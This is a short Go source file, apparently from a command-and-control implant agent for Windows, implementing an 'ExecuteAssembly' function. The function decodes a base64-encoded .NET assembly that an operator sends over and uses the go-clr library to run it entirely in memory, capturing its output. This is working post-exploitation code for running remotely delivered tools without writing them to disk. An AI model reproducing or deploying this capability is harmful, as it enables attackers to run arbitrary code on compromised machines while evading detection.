//go:build windows
// +build windows

package agentfuncs

import (
	"fmt"
	b64 "encoding/base64"
	clr "github.com/Ne0nd0g/go-clr"
)
// Ne0nd0g is my goat
// don't have to put this together myself pog

// takes the raw bytes from a .NET PE and uses Ne0nd0g's go-clr to host the CLR
// and run it in-memory. You can read the code, but obviously v4 only
func ExecuteAssembly(assemblyEnc string, params []string) string {
	assemblyBytes, err := b64.StdEncoding.DecodeString(assemblyEnc) // bytes are sent over with base64
	if err != nil {
		return "[!] Failed to upload assembly: " + err.Error()
	}
	err = clr.RedirectStdoutStderr()
	if err != nil {
		return "[!] Failed to redirect streams: " + err.Error()
	}

	runtimeHost, err := clr.LoadCLR("v4")
	if err != nil {
		return "[!] Failed to load CLR: " + err.Error()
	}

	methodInfo, err := clr.LoadAssembly(runtimeHost, assemblyBytes)
	if err != nil {
		return "[!] Failed to load assembly: " + err.Error()
	}

	stdout, stderr := clr.InvokeAssembly(methodInfo, params)
	return fmt.Sprintf("[!] STDERR:\n%s\n[+] STDOUT:\n%s\n", stderr, stdout)
} 